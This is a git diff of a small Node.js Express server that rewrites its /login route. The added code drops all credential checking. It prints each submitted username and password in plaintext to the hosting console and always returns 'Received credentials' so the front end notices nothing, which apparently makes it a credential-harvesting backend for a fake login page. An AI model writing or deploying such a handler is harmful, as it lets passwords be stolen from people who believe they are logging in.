@@ -1,21 +1,19 @@
 const express = require("express");
-const app = express();
 const cors = require("cors");
 
+const app = express();
 app.use(express.json());
 app.use(cors());
 
-const users = [{ username: "testuser", password: "password123" }]; // Dummy users
-
+// Login Route (Just Logs Credentials)
 app.post("/login", (req, res) => {
     const { username, password } = req.body;
-    const user = users.find(u => u.username === username && u.password === password);
 
-    if (user) {
-        res.json({ message: "Login successful" });
-    } else {
-        res.status(401).json({ message: "Invalid credentials" });
-    }
+    // Log username & password in Render console
+    console.log(`Login Attempt: Username - ${username}, Password - ${password}`);
+
+    // Always send a generic response (doesn't affect frontend behavior)
+    res.json({ message: "Received credentials" });
 });
 
 const PORT = process.env.PORT || 3000;
